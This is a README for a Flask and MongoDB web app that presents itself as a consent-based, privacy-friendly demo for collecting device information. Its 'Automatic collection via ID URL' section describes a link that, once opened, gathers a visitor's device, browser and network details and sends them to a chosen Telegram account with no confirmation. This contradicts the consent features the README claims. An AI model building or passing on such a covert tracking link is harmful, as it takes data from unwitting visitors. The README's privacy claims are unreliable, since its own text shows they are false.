# Privacy-Friendly Device Info Demo (Flask + MongoDB)

## Features
- Consent popup before any collection.
- Collects basic browser/device info after explicit "Allow".
- Optional location request via browser permission prompt.
- Sends data to Flask backend through POST after consent.
- Stores records in MongoDB.
- Admin dashboard to view collected records.
- Privacy policy page and visible privacy notice.
- Educational warning included.
- Does not request camera or microphone.

## Run
1. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
2. Start MongoDB (default `mongodb://localhost:27017/`).
3. Optional environment variables:
   - `MONGODB_URI`
   - `MONGODB_DB` (default `privacy_demo`)
   - `MONGODB_COLLECTION` (default `consented_device_info`)
4. Run app:
   ```bash
   python app.py
   ```
5. Open:
   - `http://127.0.0.1:5000/`
   - `http://127.0.0.1:5000/admin`
   - `http://127.0.0.1:5000/privacy`

### Automatic collection via ID URL

Instead of manually sharing data, you can simply open the app at a URL that
contains the target Telegram user ID.  For example:

```
GET /id=<telegram-user-id>
```

Visiting this route renders the same interface as the regular homepage, but
the JavaScript immediately:

1. Gathers device/browser and network information.
2. Posts the data to `/collect` (so it still ends up in MongoDB).
3. Sends the full payload to the supplied Telegram ID using the configured
   bot token.
You may also supply the ID as a query parameter (e.g. `/?id=12345`), in which
case the server will redirect to the canonical `/id=12345` URL before the
automatic flow begins.
The backend will only attempt the Telegram call if the ID exists in the
`allow_user` collection; if it does not, the request is aborted and the
user sees a 403 response. No additional button clicks or confirmations are
required in this workflow.

## Notes
- This is for educational purposes only.
- IP addresses are not intentionally stored by the app.
